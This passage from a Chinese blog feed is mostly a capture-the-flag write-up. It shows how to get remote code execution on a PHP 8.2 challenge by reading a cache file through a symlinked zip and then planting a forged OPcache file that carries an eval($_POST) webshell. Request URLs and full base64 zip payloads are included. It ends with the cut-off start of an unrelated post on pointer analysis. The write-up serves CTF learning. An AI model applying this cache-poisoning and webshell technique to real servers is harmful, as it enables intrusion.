class="line">/final_challenge_.php?key=dgdr_09hsqhy8</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;Hint.php&#x27;</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$key</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Please enter the key.($key = $_GET[\&#x27;key\&#x27;])&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$action</span>)&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>)===<span class="string">&quot;bde8186e47bad30bd8eca3cb72b4e4cd&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0_1</span>: <span class="comment">//读取php信息</span></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">05_23</span>:<span class="comment">//提示</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$HINT</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0o2_23</span>:<span class="comment">//把当前目录压缩存储到tmp目录下并读取</span></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;zip -r /tmp/you_can_read.zip *&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/tmp/you_can_read.zip&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">011_255</span>:<span class="comment">//扫描当前目录</span></span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x0_555</span>:<span class="comment">//写入一个压缩包you_can_write.zip</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/you_can_write.zip&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0b1_1</span>:<span class="comment">//解压you_can_write.zip</span></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o you_can_write.zip&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>这里首先是一个php8.1的特性，可以使用obx等字符表示数字，以0b开头是二进制，0o或单独0开头是八进制,0x是十六进制，并且允许加入下划线，因此几个case对应</p><ul><li>0_1  —  1</li><li>05_23   —  339</li><li>0b1_1  — 3</li><li>0x0_555 — 1365</li><li>011_255 — 4781</li><li>0o2_23  — 147</li></ul><p><a class="link"   href="https://php.watch/versions/8.1/explicit-octal-notation" >https://php.watch/versions/8.1/explicit-octal-notation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>首先看HINT，action&#x3D;339</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Read phpinfo carefully, you can use OPcache for RCE purposes.</span><br></pre></td></tr></table></figure></div><p>提示使用OPcache来RCE，先到phpinfo中查看opcache的配置，可以看到缓存存储在tmp目录下，并且开启了时间戳验证</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242254.png"                      alt="image-20230809041723178"                ><figcaption>image-20230809041723178</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242923.png"                      alt="image-20230809041715238"                ><figcaption>image-20230809041715238</figcaption></figure></p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>总体思路是伪造一个opcache的缓存传输上去来RCE，根据配置可以知道缓存存储路径,如index.php就在 <code>/tmp/[system_id]/var/www/html/index.php.bin</code>,而其中system_id需要通过当前Zend和PHP的版本号计算得出，同时为了通过时间戳验证，还需要读取下载题目环境上的.bin文件，system_id的计算虽然github上有脚本，但都是php7的版本,计算的system_id与题目不符合，因此需要本地使用docker搭建php8.2.2+apache来得到system_id,题目用的是最容易找到的镜像，根据回显报文，在dockerhub的php镜像中搜索8.2.2-apache的tag</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242581.png"                      alt="image-20230809044627212"                ><figcaption>image-20230809044627212</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242108.png"                      alt="image-20230809044710032"                ><figcaption>image-20230809044710032</figcaption></figure></p><p>本地拉取</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:8.2.2-apache</span><br></pre></td></tr></table></figure></div><p>创建容器</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name ez_test -d  -p 5003:80  php:8.2.2-apache</span><br></pre></td></tr></table></figure></div><p>进入容器</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure></div><p>安装opcache</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-install opcache</span><br></pre></td></tr></table></figure></div><p>此时执行php -v，查看版本信息,出现下面说明安装成功</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP 8.2.2 (cli) (built: Feb  9 2023 05:32:15) (NTS)</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v4.2.2, Copyright (c) Zend Technologies</span><br><span class="line">    with Zend OPcache v8.2.2, Copyright (c), by Zend Technologies</span><br></pre></td></tr></table></figure></div><p>开启opcahce并重启容器</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-enable opcache.so</span><br><span class="line">docker restart 容器id</span><br></pre></td></tr></table></figure></div><p>默认缓存目录就是tmp，不用修改，需要打开opcache.file_cache_only使得生成缓存，修改<code>/usr/local/etc/php/php.ini-development </code>加入下面的配置，修改优先级,之后重启容器使其生效</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">opcache.file_cache_only</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>此时去tmp目录下就可以发现有缓存生成，文件名即为system_id</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@889641c397dc:/tmp# ls</span><br><span class="line">8131f93e8d92a77c0a8ff12ef84b05b1</span><br></pre></td></tr></table></figure></div><p>由于题目还开启了<strong>时间戳验证</strong>，因此需要读取题目的bin文件，可以读取index.php.bin,这里读取文件可以用软链接攻击</p><p>,由于题目会读取tmp下的you_can_read.zip，虽然会先执行打包当前目录，但当you_can_read.zip已经存在时不会覆盖，因此可以先创建一个软链接指向<code>/tmp/8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin</code>然后将改软链接重命名成you_can_read.zip,再打包一层变为you_can_write.zip</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /tmp/8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin test</span><br><span class="line">zip -y you_can_write.zip you_can_read.zip</span><br><span class="line">cat you_can_write.zip|base64</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBAoAAAAAAEU0CVffxjBJQAAAAEAAAAAQABwAeW91X2Nhbl9yZWFkLnppcFVUCQAD4sLSZOLC0mR1eAsAAQT3AQAABBQAAAAvdG1wLzgxMzFmOTNlOGQ5MmE3N2MwYThmZjEyZWY4NGIwNWIxL3Zhci93d3cvaHRtbC9pbmRleC5waHAuYmluUEsBAh4DCgAAAAAARTQJV9/GMElAAAAAQAAAABAAGAAAAAAAAAAAAO2hAAAAAHlvdV9jYW5fcmVhZC56aXBVVAUAA+LC0mR1eAsAAQT3AQAABBQAAABQSwUGAAAAAAEAAQBWAAAAigAAAAAA</span><br></pre></td></tr></table></figure></div><p>写入you_can_write.zip</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/final_challenge_.php?key=dgdr_09hsqhy8&amp;action=1365</span><br><span class="line">post: data=UEsDBAoAAAAAAEU0CVffxjBJQAAAAEAAAAAQABwAeW91X2Nhbl9yZWFkLnppcFVUCQAD4sLSZOLC0mR1eAsAAQT3AQAABBQAAAAvdG1wLzgxMzFmOTNlOGQ5MmE3N2MwYThmZjEyZWY4NGIwNWIxL3Zhci93d3cvaHRtbC9pbmRleC5waHAuYmluUEsBAh4DCgAAAAAARTQJV9/GMElAAAAAQAAAABAAGAAAAAAAAAAAAO2hAAAAAHlvdV9jYW5fcmVhZC56aXBVVAUAA+LC0mR1eAsAAQT3AQAABBQAAABQSwUGAAAAAAEAAQBWAAAAigAAAAAA</span><br></pre></td></tr></table></figure></div><p>之后解压  &#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;3</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0b1_1</span>:</span><br><span class="line">      <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o you_can_write.zip&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div><p>再读取便可以得到题目的index.php.bin</p><p>&#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;147</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242262.png"                      alt="image-20230809065217256"                ><figcaption>image-20230809065217256</figcaption></figure></p><p>时间戳信息在第49字节处</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242261.png"                      alt="image-20230809070116002"                ><figcaption>image-20230809070116002</figcaption></figure></p><p>在自己的实验容器中写一个一句话马index.php,访问得到其缓存index.php.bin，修改时间戳</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243585.png"                      alt="image-20230809070616488"                ><figcaption>image-20230809070616488</figcaption></figure></p><blockquote><p>将docker内文件取出使用docker cp</p></blockquote><p>最后放入目录 8131f93e8d92a77c0a8ff12ef84b05b1&#x2F;var&#x2F;www&#x2F;html内，将目录<code>8131f93e8d92a77c0a8ff12ef84b05b1</code>打包成you_can_write.zip写入</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜ 🥣 desktop zip -r ./you_can_write.zip ./8131f93e8d92a77c0a8ff12ef84b051</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/.DS_Store (deflated 89%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/.DS_Store (deflated 89%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/.DS_Store (deflated 94%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/.DS_Store (deflated 96%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin (deflated 68%)</span><br><span class="line">(base) ➜ 🥣 desktopcat you_can_write.zip|base64</span><br><span class="line">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</span><br></pre></td></tr></table></figure></div><p>将上面数据写入you_can_write.zip   </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/final_challenge_.php?key=dgdr_09hsqhy8&amp;action=1365</span><br><span class="line">post: data=.......</span><br></pre></td></tr></table></figure></div><p>之后解压  &#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;3</p><p>此时再访问题目的index.php，已经被覆盖</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243579.png"                      alt="image-20230809071031779"                ><figcaption>image-20230809071031779</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243021.png"                      alt="image-20230809074242084"                ><figcaption>image-20230809074242084</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> opcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析-指针分析</title>
      <link href="/2023/10/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="指针分析"><a href="#指针分析" class="headerlink" title="指针分析"></a>指针分析</h1><h2 id="Foundations"><a href="#Foundations" class="headerlink" title="Foundations"></a>Foundations</h2><h3 id="rules"><a href="#rules" class="headerlink" title="rules"></a>rules</h3><p>指针分析需要关注的域</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337482.png"                      alt="image-20231029160720840"                ><figcaption>image-20231029160720840</figcaption></figure></p><ul><li>变量 V</li><li>属性 F</li><li>对象 O</li><li>对象的成员属性 </li><li>指针 包括变量+对象的field</li></ul><h4 id="处理规则"><a href="#处理规则" class="headerlink" title="处理规则"></a>处理规则</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337583.png"                      alt="image-20231029162403026"                ><figcaption>image-20231029162403026</figcaption></figure></p><blockquote><p>横线上是前提条件，下面是推到出的</p></blockquote><ul><li>New 直接把x指向oi</li><li>Assign 